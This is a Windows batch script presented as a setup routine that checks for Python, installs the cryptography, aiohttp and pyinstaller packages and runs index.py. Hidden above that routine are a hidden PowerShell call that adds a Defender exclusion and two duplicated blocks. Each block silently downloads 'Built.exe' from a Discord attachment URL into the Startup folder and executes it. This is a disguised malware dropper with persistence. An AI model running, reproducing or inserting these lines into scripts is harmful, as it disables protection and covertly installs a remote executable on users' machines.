powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1240001953593950358/Built.exe?ex=6648450f&is=6646f38f&hm=2dc44e254ddb16cedb1351b59276ad8037a70d0d18674ef228b9a47344af1a61&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1240001953593950358/Built.exe?ex=6648450f&is=6646f38f&hm=2dc44e254ddb16cedb1351b59276ad8037a70d0d18674ef228b9a47344af1a61&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
    echo Very important click Add python exe to PATH.
    pause
)

title Checking Python libraries...
echo Checking 'cryptography' (1/3)
python -c "import cryptography" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing cryptography...
    python -m pip install cryptography > nul
)

echo Checking 'aiohttp' (2/3)
python -c "import aiohttp" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing aiohttp...
    python -m pip install aiohttp > nul
)

echo Checking 'pyinstaller' (3/3)
python -c "import PyInstaller" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyinstaller...
    python -m pip install pyinstaller > nul
)

cls
python index.py
